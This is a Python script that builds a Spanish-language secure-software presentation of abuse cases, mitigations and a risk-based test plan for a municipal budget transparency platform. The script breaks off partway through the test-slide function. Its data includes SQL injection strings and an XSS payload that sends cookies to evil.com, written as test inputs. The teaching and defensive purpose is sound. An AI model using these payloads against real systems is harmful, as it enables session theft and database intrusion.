# -*- coding: utf-8 -*-
"""
Generador de presentación: Casos de Abuso y Gestión de Riesgos
Proyecto: Plataforma de Transparencia y Seguimiento de Gasto Público Municipal
ODS 16 - Paz, Justicia e Instituciones Sólidas
"""

from pptx import Presentation
from pptx.util import Inches, Pt, Emu
from pptx.dml.color import RGBColor
from pptx.enum.text import PP_ALIGN
from pptx.util import Cm
import copy

# ── Paleta de colores ODS 16 ──────────────────────────────────────────────────
AZUL_ODS     = RGBColor(0x00, 0x58, 0x8B)   # Azul profundo institucional
AZUL_CLARO   = RGBColor(0x1A, 0x73, 0xB8)   # Azul medio
ROJO_RIESGO  = RGBColor(0xC0, 0x39, 0x2B)   # Rojo crítico
NARANJA      = RGBColor(0xE6, 0x7E, 0x22)   # Naranja alto
AMARILLO     = RGBColor(0xF3, 0x9C, 0x12)   # Amarillo medio
VERDE        = RGBColor(0x27, 0xAE, 0x60)   # Verde bajo
BLANCO       = RGBColor(0xFF, 0xFF, 0xFF)
GRIS_OSCURO  = RGBColor(0x2C, 0x3E, 0x50)
GRIS_CLARO   = RGBColor(0xEC, 0xF0, 0xF1)
GRIS_MED     = RGBColor(0xBD, 0xC3, 0xC7)

# ── Datos del proyecto ────────────────────────────────────────────────────────
PROYECTO = "GastoTransparente Municipal"
SUBTITULO = "Plataforma de Transparencia y Seguimiento de Gasto Público Municipal"
ODS = "ODS 16 — Paz, Justicia e Instituciones Sólidas"
INTEGRANTES = [
    "Rodrigo Vallejo"
]
FECHA = "Septiembre 2026"

# ── Requisitos de seguridad ───────────────────────────────────────────────────
REQUISITOS = [
    {
        "id": "RS-01",
        "tipo": "Funcional",
        "nombre": "Autenticación Multifactor (MFA)",
        "desc": "El sistema debe requerir MFA para todos los usuarios con roles de editor, auditor y administrador.",
        "justif": "Previene accesos no autorizados incluso si las credenciales son comprometidas por phishing o fuerza bruta.",
    },
    {
        "id": "RS-02",
        "tipo": "No Funcional",
        "nombre": "Cifrado de Datos en Reposo y Tránsito",
        "desc": "Todos los datos sensibles se cifran con AES-256 en reposo y TLS 1.3 en tránsito.",
        "justif": "Garantiza confidencialidad e integridad ante accesos no autorizados a la infraestructura.",
    },
    {
        "id": "RS-03",
        "tipo": "Funcional",
        "nombre": "Registro de Auditoría Inmutable",
        "desc": "Cada inserción, modificación o eliminación de registros presupuestales genera una entrada en un log append-only firmado.",
        "justif": "Permite trazabilidad completa de cambios y detecta manipulaciones de datos públicos.",
    },
    {
        "id": "RS-04",
        "tipo": "No Funcional",
        "nombre": "Protección Anti-DDoS y Rate Limiting",
        "desc": "La plataforma debe soportar picos de 50.000 req/min con rate limiting por IP/token y CDN con scrubbing DDoS.",
        "justif": "El proyecto es políticamente sensible; un DDoS en período electoral puede silenciar la rendición de cuentas.",
    },
    {
        "id": "RS-05",
        "tipo": "Funcional",
        "nombre": "Control de Acceso Basado en Roles (RBAC)",
        "desc": "Se definen roles: Ciudadano (solo lectura), Editor (escritura limitada), Auditor (revisión), Administrador (gestión total).",
        "justif": "Limita el radio de acción de credenciales comprometidas y reduce el riesgo de modificaciones no autorizadas.",
    },
    {
        "id": "RS-06",
        "tipo": "Funcional",
        "nombre": "Firma Digital de Registros Presupuestales",
        "desc": "Cada registro público publicado debe incluir firma digital del funcionario responsable verificable por cualquier ciudadano.",
        "justif": "Garantiza autenticidad e impide la repudiación; cualquier alteración invalida la firma.",
    },
    {
        "id": "RS-07",
        "tipo": "No Funcional",
        "nombre": "Expiración de Sesión por Inactividad",
        "desc": "Las sesiones de usuarios privilegiados expiran tras 10 minutos de inactividad; ciudadanos a los 30 minutos.",
        "justif": "Reduce la ventana de explotación de sesiones abiertas en equipos compartidos o robados.",
    },
    {
        "id": "RS-08",
        "tipo": "Funcional",
        "nombre": "Validación y Sanitización de Entradas",
        "desc": "Todos los campos de formulario y parámetros de API deben validarse con whitelist y sanitizarse contra SQLi, XSS y Path Traversal.",
        "justif": "Bloquea las técnicas de inyección más comunes definidas en OWASP Top 10.",
    },
    {
        "id": "RS-09",
        "tipo": "No Funcional",
        "nombre": "Política de Contraseñas y Bloqueo de Cuenta",
        "desc": "Contraseñas mínimo 12 caracteres con complejidad; bloqueo temporal tras 5 intentos fallidos; notificación por e-mail.",
        "justif": "Mitiga ataques de fuerza bruta y credential stuffing contra cuentas de funcionarios.",
    },
    {
        "id": "RS-10",
        "tipo": "Funcional",
        "nombre": "Notificaciones de Seguridad en Tiempo Real",
        "desc": "El SIEM debe alertar en menos de 60 segundos ante anomalías: accesos fuera de horario, volumen inusual de descargas, cambios masivos.",
        "justif": "Permite respuesta temprana ante incidentes y reduce el tiempo medio de detección (MTTD).",
    },
]

# ── Casos de abuso ────────────────────────────────────────────────────────────
CASOS_ABUSO = [
    {
        "id": "CA-01",
        "nombre": "Manipulación de Registros Presupuestales por Funcionario Interno",
        "atacante": "Funcionario municipal con acceso editor",
        "objetivo": "Alterar montos de contratos públicos para ocultar desviación de fondos",
        "acciones": [
            "Inicia sesión con credenciales legítimas",
            "Edita registros de contratos adjudicados cambiando montos",
            "Borra el historial de cambios si el sistema lo permite",
        ],
        "impacto": "Pérdida de integridad de datos públicos; desinformación ciudadana; encubrimiento de corrupción",
        "mitigaciones": [
            "Log de auditoría append-only con firma digital",
            "Workflow de aprobación dual para cambios críticos",
            "Alertas automáticas por modificaciones fuera de rango",
        ],
        "riesgo": "CRÍTICO",
        "probabilidad": "Alta",
        "impacto_nivel": "Alto",
    },
    {
        "id": "CA-02",
        "nombre": "Ataque DDoS durante Rendición de Cuentas Electoral",
        "atacante": "Grupo político adversario o actor externo",
        "objetivo": "Silenciar la plataforma en momentos de alta visibilidad pública",
        "acciones": [
            "Coordinación de botnet para enviar millones de solicitudes HTTP",
            "Saturar endpoints de búsqueda y descarga de informes",
            "Usar IPs rotativas para evadir bloqueos simples",
        ],
        "impacto": "Indisponibilidad del servicio en período crítico; daño a la confianza pública; silencio informativo",
        "mitigaciones": [
            "CDN con protección DDoS (Cloudflare/AWS Shield)",
            "Rate limiting por IP, token y geolocalización",
            "Auto-scaling y arquitectura serverless para absorber picos",
        ],
        "riesgo": "CRÍTICO",
        "probabilidad": "Alta",
        "impacto_nivel": "Alto",
    },
    {
        "id": "CA-03",
        "nombre": "Inyección SQL en Buscador de Contratos",
        "atacante": "Atacante externo con conocimiento técnico",
        "objetivo": "Extraer datos confidenciales de la base de datos o eliminar registros",
        "acciones": [
            "Ingresa payloads SQL en el campo de búsqueda: ' OR '1'='1'--",
            "Usa UNION SELECT para extraer tablas internas",
            "Intenta DROP TABLE para destruir el historial",
        ],
        "impacto": "Exposición de datos internos, credenciales o documentos pre-publicación; destrucción de registros históricos",
        "mitigaciones": [
            "Usar ORM con consultas parametrizadas",
            "WAF (Web Application Firewall) con reglas OWASP",
            "Principio de mínimo privilegio en usuario de BD",
        ],
        "riesgo": "ALTO",
        "probabilidad": "Media",
        "impacto_nivel": "Alto",
    },
    {
        "id": "CA-04",
        "nombre": "XSS Persistente en Panel de Comentarios Ciudadanos",
        "atacante": "Ciudadano malintencionado o actor político",
        "objetivo": "Robar sesiones de administradores o inyectar desinformación visual",
        "acciones": [
            "Publica comentario con script malicioso: <script>document.cookie</script>",
            "El script se ejecuta al visualizar el comentario desde el panel admin",
            "Exfiltra token de sesión del administrador",
        ],
        "impacto": "Toma de control de cuenta admin; desinformación masiva visible a ciudadanos; defacement",
        "mitigaciones": [
            "Sanitización de salida HTML (DOMPurify / Content-Security-Policy)",
            "Tokens de sesión HttpOnly y Secure",
            "Revisión humana de comentarios antes de publicación",
        ],
        "riesgo": "ALTO",
        "probabilidad": "Media",
        "impacto_nivel": "Alto",
    },
    {
        "id": "CA-05",
        "nombre": "Suplantación de Identidad de Funcionario (Phishing)",
        "atacante": "Atacante externo con acceso a email corporativo comprometido",
        "objetivo": "Publicar datos falsos haciéndose pasar por un funcionario autorizado",
        "acciones": [
            "Envía e-mail de phishing al funcionario para robar credenciales",
            "Accede al panel con las credenciales robadas",
            "Publica contratos falsos o altera montos de presupuesto",
        ],
        "impacto": "Datos falsos publicados como oficiales; pérdida de credibilidad institucional; crisis de confianza",
        "mitigaciones": [
            "MFA obligatorio (TOTP o FIDO2)",
            "Análisis de comportamiento: login desde IP/país inusual → bloqueo",
            "Capacitación anti-phishing para funcionarios",
        ],
        "riesgo": "CRÍTICO",
        "probabilidad": "Alta",
        "impacto_nivel": "Alto",
    },
    {
        "id": "CA-06",
        "nombre": "Acceso No Autorizado a Reportes Confidenciales (IDOR)",
        "atacante": "Ciudadano o periodista con acceso básico",
        "objetivo": "Acceder a informes de auditoría internos antes de su publicación oficial",
        "acciones": [
            "Observa la URL: /reportes/2026/informe_123.pdf",
            "Modifica el ID: /reportes/2026/informe_001.pdf (pre-publicación)",
            "Descarga documentos confidenciales iterando IDs",
        ],
        "impacto": "Filtración de datos de auditoría; uso político de información preliminar; violación de proceso institucional",
        "mitigaciones": [
            "UUIDs no predecibles en lugar de IDs secuenciales",
            "Verificación de permisos en cada solicitud de recurso",
            "Logs de acceso a documentos sensibles con alertas",
        ],
        "riesgo": "ALTO",
        "probabilidad": "Media",
        "impacto_nivel": "Medio",
    },
    {
        "id": "CA-07",
        "nombre": "Fuerza Bruta sobre Cuentas de Auditores",
        "atacante": "Atacante automatizado (script/bot)",
        "objetivo": "Obtener acceso privilegiado a la plataforma mediante ataque de diccionario",
        "acciones": [
            "Usa lista de contraseñas comunes (rockyou.txt)",
            "Ataca el endpoint de login con miles de combinaciones por minuto",
            "Prueba credential stuffing con brechas de datos previas",
        ],
        "impacto": "Compromiso de cuenta de auditor; acceso a datos internos; posibilidad de manipular registros",
        "mitigaciones": [
            "Bloqueo de IP tras 5 intentos fallidos con CAPTCHA",
            "Notificación inmediata al usuario por intento fallido",
            "MFA como segunda barrera aunque la contraseña sea débil",
        ],
        "riesgo": "ALTO",
        "probabilidad": "Alta",
        "impacto_nivel": "Alto",
    },
    {
        "id": "CA-08",
        "nombre": "Defacement del Portal Público",
        "atacante": "Hacktivista o grupo de presión política",
        "objetivo": "Alterar la apariencia del portal para difundir mensajes de desinformación",
        "acciones": [
            "Explota vulnerabilidad en CMS o dependencia desactualizada",
            "Reemplaza página principal con contenido político falso",
            "Deja mensaje o malware para afectar visitantes",
        ],
        "impacto": "Daño reputacional severo; pérdida de confianza institucional; posible infección de visitantes",
        "mitigaciones": [
            "WAF + IDS/IPS con reglas de detección de modificación de archivos",
            "Monitoreo de integridad de archivos (AIDE/Tripwire)",
            "Pipeline CI/CD con despliegues inmutables (infraestructura como código)",
        ],
        "riesgo": "ALTO",
        "probabilidad": "Media",
        "impacto_nivel": "Alto",
    },
    {
        "id": "CA-09",
        "nombre": "Exfiltración Masiva de Datos vía API sin Paginación",
        "atacante": "Competidor, lobbyist o actor con interés económico",
        "objetivo": "Descargar toda la base de datos de contratos públicos para análisis privado no autorizado",
        "acciones": [
            "Obtiene API key pública o token legítimo de ciudadano",
            "Itera llamadas a /api/contratos?page=1..N sin restricción",
            "Exporta la BD completa en pocas horas para uso privado",
        ],
        "impacto": "Uso comercial no autorizado de datos públicos; posible identificación de patrones para soborno; carga excesiva en servidor",
        "mitigaciones": [
            "Rate limiting por token: máx. 100 req/min",
            "Paginación obligatoria con límite de resultados por página",
            "Términos de uso claros con registro de API keys",
        ],
        "riesgo": "MEDIO",
        "probabilidad": "Alta",
        "impacto_nivel": "Medio",
    },
    {
        "id": "CA-10",
        "nombre": "Carga de Documentos Maliciosos (Malware Upload)",
        "atacante": "Funcionario comprometido o atacante con acceso editor",
        "objetivo": "Alojar malware en el servidor bajo apariencia de documentos oficiales",
        "acciones": [
            "Sube archivo .pdf con macro maliciosa o .docx con payload",
            "El archivo queda publicado como 'Informe Oficial'",
            "Ciudadanos descargan el archivo e infectan sus equipos",
        ],
        "impacto": "Infección masiva de ciudadanos; daño reputacional crítico; responsabilidad legal del municipio",
        "mitigaciones": [
            "Análisis antivirus en tiempo real en el servidor de carga (ClamAV/VirusTotal API)",
            "Solo permitir extensiones seguras con validación MIME real",
            "Sandbox de documentos antes de publicación definitiva",
        ],
        "riesgo": "ALTO",
        "probabilidad": "Baja",
        "impacto_nivel": "Alto",
    },
]

# ── Pruebas de riesgo por caso de abuso ──────────────────────────────────────
PRUEBAS = [
    {
        "ca": "CA-01",
        "objetivo": "Verificar que el log de auditoría registra toda modificación de registros presupuestales",
        "procedimiento": "Editar un contrato existente y verificar que el cambio queda registrado con usuario, timestamp y hash del valor anterior",
        "resultado_esperado": "Entrada inmutable en log con firma digital; alerta enviada al supervisor",
        "criterio": "El log no puede ser borrado ni editado por el mismo usuario que hizo el cambio",
    },
    {
        "ca": "CA-02",
        "objetivo": "Evaluar la resistencia del sistema a un ataque DDoS simulado",
        "procedimiento": "Enviar 10.000 req/min durante 5 minutos con Apache JMeter contra el endpoint de búsqueda",
        "resultado_esperado": "El sistema mantiene respuesta <3s para el 95% de usuarios legítimos; las IPs atacantes son bloqueadas",
        "criterio": "No se produce caída total del servicio; el rate limiter actúa en <10s",
    },
    {
        "ca": "CA-03",
        "objetivo": "Detectar vulnerabilidades de inyección SQL en el buscador de contratos",
        "procedimiento": "Usar SQLMap y payloads manuales (' OR '1'='1'--, UNION SELECT) en todos los campos de entrada",
        "resultado_esperado": "El sistema rechaza las entradas maliciosas con HTTP 400; no se retorna información de BD",
        "criterio": "Cero consultas SQL no parametrizadas ejecutadas; WAF registra y bloquea el intento",
    },
    {
        "ca": "CA-04",
        "objetivo": "Verificar que el sistema neutraliza scripts maliciosos en comentarios",
        "procedimiento": "Insertar <script>alert(1)</script> y <img onerror=fetch('evil.com?c='+document.cookie)> en campos de comentario",
        "resultado_esperado": "El script no se ejecuta; la salida aparece como texto plano o es eliminada",
        "criterio": "Content-Security-Policy bloquea la ejecución; tokens de sesión no son accesibles via JS",
    },
    {
        "ca": "CA-05",
        "objetivo": "Verificar que MFA bloquea el acceso con credenciales robadas",
        "procedimiento": "Con usuario y contraseña válidos (simulando phishing exitoso), intentar login sin el segundo factor",
        "resultado_esperado": "El sistema deniega el acceso y solicita el segundo factor; se notifica al usuario legítimo",
        "criterio": "Imposible autenticarse con solo usuario+contraseña desde IP no reconocida",
    },
    {
        "ca": "CA-06",
        "objetivo": "Detectar vulnerabilidades IDOR en endpoints de documentos",
        "procedimiento": "Con un usuario ciudadano, modificar manualmente el UUID en URLs de reportes internos y usar Burp Suite para iterar IDs",
        "resultado_esperado": "HTTP 403 Forbidden para cualquier documento al que el usuario no tenga permiso explícito",
        "criterio": "Cero accesos exitosos a recursos no autorizados; todos los intentos quedan en log",
    },
    {
        "ca": "CA-07",
        "objetivo": "Verificar que el sistema bloquea ataques de fuerza bruta",
        "procedimiento": "Ejecutar Hydra con lista de 1000 contraseñas comunes contra el endpoint de login de un auditor",
        "resultado_esperado": "La cuenta se bloquea temporalmente tras 5 intentos fallidos; se activa CAPTCHA",
        "criterio": "Menos del 0.1% de intentos de fuerza bruta resultan en login exitoso",
    },
    {
        "ca": "CA-08",
        "objetivo": "Detectar modificaciones no autorizadas en archivos del portal",
        "procedimiento": "Modificar un archivo JS de la página principal directamente en el servidor; verificar que el sistema de monitoreo lo detecta",
        "resultado_esperado": "Alerta generada en menos de 60 segundos; archivo restaurado automáticamente si es posible",
        "criterio": "Sistema de integridad de archivos detecta cambio y notifica al equipo de seguridad",
    },
    {
        "ca": "CA-09",
        "objetivo": "Verificar que el rate limiting protege contra exfiltración masiva via API",
        "procedimiento": "Con token legítimo, hacer 500 llamadas a /api/contratos en 1 minuto usando script Python",
        "resultado_esperado": "El sistema devuelve HTTP 429 (Too Many Requests) a partir de la solicitud 101",
        "criterio": "El rate limit se aplica correctamente; las solicitudes excedentes no retornan datos",
    },
    {
        "ca": "CA-10",
        "objetivo": "Verificar que el sistema rechaza archivos maliciosos en la carga",
        "procedimiento": "Intentar subir archivos .exe, .php, .docx con macro y PDF con JavaScript embebido",
        "resultado_esperado": "El sistema rechaza archivos no permitidos con mensaje de error; ningún archivo malicioso queda en el servidor",
        "criterio": "Solo se aceptan extensiones de lista blanca; el análisis antivirus detecta los archivos de prueba EICAR",
    },
]

COLORES_RIESGO = {
    "CRÍTICO": ROJO_RIESGO,
    "ALTO": NARANJA,
    "MEDIO": AMARILLO,
    "BAJO": VERDE,
}

# ─────────────────────────────────────────────────────────────────────────────
# Helpers de presentación
# ─────────────────────────────────────────────────────────────────────────────

def add_slide(prs, layout_idx=6):
    layout = prs.slide_layouts[layout_idx]
    return prs.slides.add_slide(layout)

def set_bg(slide, color: RGBColor):
    from pptx.util import Pt
    from pptx.oxml.ns import qn
    from lxml import etree
    bg = slide.background
    fill = bg.fill
    fill.solid()
    fill.fore_color.rgb = color

def txt(tf, text, size=12, bold=False, color=GRIS_OSCURO, align=PP_ALIGN.LEFT, italic=False):
    p = tf.add_paragraph()
    p.alignment = align
    run = p.add_run()
    run.text = text
    run.font.size = Pt(size)
    run.font.bold = bold
    run.font.italic = italic
    run.font.color.rgb = color
    return p

def clear_tf(tf):
    for para in tf.paragraphs:
        for run in para.runs:
            run.text = ""

def box(slide, left, top, width, height, text="", size=11, bold=False,
        bg_color=None, text_color=GRIS_OSCURO, align=PP_ALIGN.LEFT,
        border_color=None, italic=False, wrap=True):
    from pptx.util import Pt
    txBox = slide.shapes.add_textbox(Inches(left), Inches(top), Inches(width), Inches(height))
    txBox.word_wrap = wrap
    if bg_color:
        txBox.fill.solid()
        txBox.fill.fore_color.rgb = bg_color
    if border_color:
        txBox.line.color.rgb = border_color
        txBox.line.width = Pt(1)
    tf = txBox.text_frame
    tf.word_wrap = wrap
    p = tf.paragraphs[0]
    p.alignment = align
    run = p.add_run()
    run.text = text
    run.font.size = Pt(size)
    run.font.bold = bold
    run.font.italic = italic
    run.font.color.rgb = text_color
    return txBox

def rect(slide, left, top, width, height, color, border=None):
    from pptx.util import Pt
    from pptx.enum.shapes import MSO_SHAPE_TYPE
    shape = slide.shapes.add_shape(
        1,  # MSO_SHAPE.RECTANGLE
        Inches(left), Inches(top), Inches(width), Inches(height)
    )
    shape.fill.solid()
    shape.fill.fore_color.rgb = color
    if border:
        shape.line.color.rgb = border
        shape.line.width = Pt(1)
    else:
        shape.line.fill.background()
    return shape


# ─────────────────────────────────────────────────────────────────────────────
# Slide 1: Portada
# ─────────────────────────────────────────────────────────────────────────────
def slide_portada(prs):
    slide = add_slide(prs, 6)
    set_bg(slide, AZUL_ODS)

    # Franja superior ODS
    rect(slide, 0, 0, 10, 0.8, AZUL_CLARO)
    box(slide, 0.2, 0.1, 9.6, 0.6,
        "ODS 16 — Paz, Justicia e Instituciones Sólidas",
        size=14, bold=True, text_color=BLANCO, align=PP_ALIGN.CENTER)

    # Título principal
    box(slide, 0.5, 1.2, 9, 1.1,
        "Casos de Abuso y Gestión de Riesgos",
        size=30, bold=True, text_color=BLANCO, align=PP_ALIGN.CENTER)

    # Subtítulo proyecto
    box(slide, 0.5, 2.4, 9, 0.6,
        "GastoTransparente Municipal",
        size=20, bold=True, text_color=AMARILLO, align=PP_ALIGN.CENTER)

    box(slide, 0.5, 3.05, 9, 0.5,
        "Plataforma de Transparencia y Seguimiento de Gasto Público Municipal",
        size=13, bold=False, text_color=GRIS_CLARO, align=PP_ALIGN.CENTER, italic=True)

    # Línea separadora
    rect(slide, 1.5, 3.7, 7, 0.05, AMARILLO)

    # Integrantes
    box(slide, 0.5, 3.85, 9, 0.3,
        "Integrantes:", size=11, bold=True, text_color=GRIS_CLARO, align=PP_ALIGN.CENTER)
    box(slide, 0.5, 4.15, 9, 0.3,
        " · ".join(INTEGRANTES),
        size=12, text_color=BLANCO, align=PP_ALIGN.CENTER)

    # Fecha
    box(slide, 0.5, 4.9, 9, 0.3,
        "Software Seguro — " + FECHA,
        size=10, text_color=GRIS_MED, align=PP_ALIGN.CENTER, italic=True)

    # Franja inferior
    rect(slide, 0, 5.3, 10, 0.2, AMARILLO)


# ─────────────────────────────────────────────────────────────────────────────
# Slide 2: Contexto del Proyecto
# ─────────────────────────────────────────────────────────────────────────────
def slide_contexto(prs):
    slide = add_slide(prs, 6)
    set_bg(slide, BLANCO)
    rect(slide, 0, 0, 10, 0.75, AZUL_ODS)
    box(slide, 0.3, 0.1, 9.4, 0.55,
        "Contexto del Proyecto",
        size=20, bold=True, text_color=BLANCO, align=PP_ALIGN.CENTER)

    rect(slide, 0.3, 0.9, 4.2, 3.5, GRIS_CLARO, AZUL_CLARO)
    box(slide, 0.4, 1.0, 4.0, 0.35, "Descripción", size=12, bold=True, text_color=AZUL_ODS)

    desc_items = [
        "Sistema web público para visualizar, consultar y descargar información sobre el presupuesto y gasto público municipal.",
        "",
        "Permite a ciudadanos, periodistas y organizaciones fiscalizar el uso de fondos públicos en tiempo real.",
        "",
        "Datos son de carácter público, pero con alto riesgo de manipulación por actores políticos o económicos.",
    ]
    y = 1.4
    for item in desc_items:
        box(slide, 0.5, y, 3.9, 0.3, item, size=10, text_color=GRIS_OSCURO)
        y += 0.3

    rect(slide, 5.0, 0.9, 4.6, 3.5, GRIS_CLARO, AZUL_CLARO)
    box(slide, 5.1, 1.0, 4.4, 0.35, "Atributos de Seguridad Clave", size=12, bold=True, text_color=AZUL_ODS)

    attrs = [
        ("Integridad", "Control de versiones auditable de cada registro publicado"),
        ("Disponibilidad", "Alta disponibilidad ante ataques DDoS en períodos electorales"),
        ("Confidencialidad", "Protección de documentos internos antes de publicación"),
        ("Trazabilidad", "Log inmutable de todas las modificaciones con firma digital"),
        ("Autenticidad", "Firma digital de funcionarios en datos publicados"),
    ]
    y = 1.45
    for attr, desc in attrs:
        box(slide, 5.1, y, 1.3, 0.35, attr + ":", size=10, bold=True, text_color=AZUL_ODS)
        box(slide, 6.5, y, 3.0, 0.35, desc, size=9, text_color=GRIS_OSCURO)
        y += 0.5

    rect(slide, 0.3, 4.5, 9.4, 0.9, RGBColor(0xFD, 0xF2, 0xE9), NARANJA)
    box(slide, 0.4, 4.55, 9.2, 0.35,
        "Sensibilidad Política: La plataforma opera en contexto de alto escrutinio público.",
        size=11, bold=True, text_color=NARANJA)
    box(slide, 0.4, 4.9, 9.2, 0.35,
        "Un incidente de seguridad no es solo un problema técnico — es una crisis institucional con impacto en la democracia municipal.",
        size=10, text_color=GRIS_OSCURO)

    rect(slide, 0, 5.45, 10, 0.07, AZUL_ODS)


# ─────────────────────────────────────────────────────────────────────────────
# Slide 3: Requisitos de Seguridad (tabla)
# ─────────────────────────────────────────────────────────────────────────────
def slide_requisitos(prs):
    slide = add_slide(prs, 6)
    set_bg(slide, BLANCO)
    rect(slide, 0, 0, 10, 0.75, AZUL_ODS)
    box(slide, 0.3, 0.1, 9.4, 0.55,
        "Requisitos de Seguridad",
        size=20, bold=True, text_color=BLANCO, align=PP_ALIGN.CENTER)

    # Encabezados tabla
    headers = ["ID", "Tipo", "Requisito", "Justificación"]
    widths  = [0.55, 0.9, 3.4, 4.7]
    lefts   = [0.15, 0.72, 1.65, 5.08]
    top_h   = 0.82

    rect(slide, 0.15, top_h, 9.7, 0.3, AZUL_ODS)
    for h, l, w in zip(headers, lefts, widths):
        box(slide, l, top_h + 0.02, w, 0.26, h,
            size=9, bold=True, text_color=BLANCO)

    row_h = 0.42
    for i, r in enumerate(REQUISITOS):
        y = top_h + 0.3 + i * row_h
        bg = GRIS_CLARO if i % 2 == 0 else BLANCO
        rect(slide, 0.15, y, 9.7, row_h, bg)
        tipo_color = AZUL_CLARO if r["tipo"] == "Funcional" else NARANJA
        values = [r["id"], r["tipo"], r["nombre"], r["justif"]]
        for v, l, w, in zip(values, lefts, widths):
            tc = tipo_color if v == r["tipo"] else GRIS_OSCURO
            bold = v == r["id"]
            box(slide, l, y + 0.03, w, row_h - 0.06, v,
                size=8, bold=bold, text_color=tc)

    rect(slide, 0, 5.45, 10, 0.07, AZUL_ODS)


# ─────────────────────────────────────────────────────────────────────────────
# Slides 4-13: Un slide por caso de abuso
# ─────────────────────────────────────────────────────────────────────────────
def slide_caso_abuso(prs, caso, idx):
    slide = add_slide(prs, 6)
    set_bg(slide, BLANCO)

    risk_color = COLORES_RIESGO.get(caso["riesgo"], GRIS_MED)

    # Header
    rect(slide, 0, 0, 10, 0.75, AZUL_ODS)
    box(slide, 0.3, 0.08, 7.5, 0.3,
        f"{caso['id']} — {caso['nombre']}",
        size=13, bold=True, text_color=BLANCO)
    box(slide, 0.3, 0.42, 5, 0.28,
        f"Caso de Abuso #{idx} | Software Seguro 2026",
        size=9, text_color=GRIS_CLARO, italic=True)

    # Badge de riesgo
    rect(slide, 7.8, 0.1, 2.0, 0.55, risk_color)
    box(slide, 7.8, 0.12, 2.0, 0.25, "RIESGO", size=8, bold=True,
        text_color=BLANCO, align=PP_ALIGN.CENTER)
    box(slide, 7.8, 0.35, 2.0, 0.25, caso["riesgo"], size=12, bold=True,
        text_color=BLANCO, align=PP_ALIGN.CENTER)

    # Columna izquierda
    col_w = 4.5
    y = 0.88

    rect(slide, 0.15, y, col_w, 0.3, AZUL_CLARO)
    box(slide, 0.2, y + 0.04, col_w - 0.1, 0.22,
        "Atacante", size=10, bold=True, text_color=BLANCO)
    y += 0.3
    rect(slide, 0.15, y, col_w, 0.4, GRIS_CLARO)
    box(slide, 0.2, y + 0.04, col_w - 0.1, 0.32,
        caso["atacante"], size=10, text_color=GRIS_OSCURO)
    y += 0.4

    rect(slide, 0.15, y, col_w, 0.3, AZUL_CLARO)
    box(slide, 0.2, y + 0.04, col_w - 0.1, 0.22,
        "Objetivo del Ataque", size=10, bold=True, text_color=BLANCO)
    y += 0.3
    rect(slide, 0.15, y, col_w, 0.5, GRIS_CLARO)
    box(slide, 0.2, y + 0.04, col_w - 0.1, 0.42,
        caso["objetivo"], size=10, text_color=GRIS_OSCURO)
    y += 0.5

    rect(slide, 0.15, y, col_w, 0.3, AZUL_CLARO)
    box(slide, 0.2, y + 0.04, col_w - 0.1, 0.22,
        "Acciones del Atacante", size=10, bold=True, text_color=BLANCO)
    y += 0.3
    h_acc = 0.38 * len(caso["acciones"])
    rect(slide, 0.15, y, col_w, h_acc, GRIS_CLARO)
    for j, acc in enumerate(caso["acciones"]):
        box(slide, 0.2, y + j * 0.38 + 0.04, col_w - 0.1, 0.34,
            f"  {j+1}. {acc}", size=9.5, text_color=GRIS_OSCURO)
    y += h_acc

    rect(slide, 0.15, y, col_w, 0.3, ROJO_RIESGO)
    box(slide, 0.2, y + 0.04, col_w - 0.1, 0.22,
        "Impacto Potencial", size=10, bold=True, text_color=BLANCO)
    y += 0.3
    rect(slide, 0.15, y, col_w, 0.55, RGBColor(0xFD, 0xEB, 0xEB))
    box(slide, 0.2, y + 0.04, col_w - 0.1, 0.47,
        caso["impacto"], size=9.5, text_color=ROJO_RIESGO, bold=True)

    # Columna derecha: Mitigaciones + Métricas
    x2 = 4.85
    y2 = 0.88

    rect(slide, x2, y2, col_w, 0.3, VERDE)
    box(slide, x2 + 0.05, y2 + 0.04, col_w - 0.1, 0.22,
        "Mitigaciones", size=10, bold=True, text_color=BLANCO)
    y2 += 0.3
    h_mit = 0.45 * len(caso["mitigaciones"])
    rect(slide, x2, y2, col_w, h_mit, RGBColor(0xE8, 0xF8, 0xF1))
    for j, mit in enumerate(caso["mitigaciones"]):
        box(slide, x2 + 0.05, y2 + j * 0.45 + 0.05, col_w - 0.1, 0.4,
            f"  ✓ {mit}", size=9.5, text_color=VERDE, bold=True)
    y2 += h_mit + 0.1

    # Métricas de riesgo
    rect(slide, x2, y2, col_w, 0.3, GRIS_OSCURO)
    box(slide, x2 + 0.05, y2 + 0.04, col_w - 0.1, 0.22,
        "Métricas de Riesgo", size=10, bold=True, text_color=BLANCO)
    y2 += 0.3

    metricas = [
        ("Probabilidad", caso["probabilidad"]),
        ("Impacto", caso["impacto_nivel"]),
        ("Nivel de Riesgo", caso["riesgo"]),
    ]
    colors_prob = {"Alta": ROJO_RIESGO, "Media": NARANJA, "Baja": VERDE}
    colors_imp  = {"Alto": ROJO_RIESGO, "Medio": NARANJA, "Bajo": VERDE}

    for label, val in metricas:
        if label == "Probabilidad":
            vc = colors_prob.get(val, GRIS_MED)
        elif label == "Impacto":
            vc = colors_imp.get(val, GRIS_MED)
        else:
            vc = risk_color
        rect(slide, x2, y2, col_w * 0.55, 0.38, GRIS_CLARO)
        box(slide, x2 + 0.05, y2 + 0.06, col_w * 0.55 - 0.1, 0.26,
            label, size=9, text_color=GRIS_OSCURO, bold=True)
        rect(slide, x2 + col_w * 0.55, y2, col_w * 0.45, 0.38, vc)
        box(slide, x2 + col_w * 0.55 + 0.05, y2 + 0.06, col_w * 0.45 - 0.1, 0.26,
            val, size=9, text_color=BLANCO, bold=True, align=PP_ALIGN.CENTER)
        y2 += 0.38

    rect(slide, 0, 5.45, 10, 0.07, AZUL_ODS)


# ─────────────────────────────────────────────────────────────────────────────
# Slide 14+: Plan de Pruebas de Seguridad (2 pruebas por slide)
# ─────────────────────────────────────────────────────────────────────────────
def slides_pruebas(prs):
    for i in range(0, len(PRUEBAS), 2):
        slide = add_slide(prs, 6)
        set_bg(slide, BLANCO)
        rect(slide, 0, 0, 10, 0.75, GRIS_OSCURO)
        box(slide, 0.3, 0.08, 9.4, 0.3,
            "Plan de Pruebas de Seguridad Basadas en Riesgo",
            size=16, bold=True, text_color=BLANCO, align=PP_ALIGN.CENTER)
        box(slide, 0.3, 0.42, 9.4, 0.28,
            f"Pruebas {PRUEBAS[i]['ca']}" + (f" — {PRUEBAS[i+1]['ca']}" if i+1 < len(PRUEBAS) else ""),
            size=10, text_color=GRIS_CLARO, italic=True, align=PP_ALIGN.CENTER)

        batch = PRUEBAS[i: i+2]
        for j, prueba in enumerate(batch):
            top = 0.85 + j * 2.4
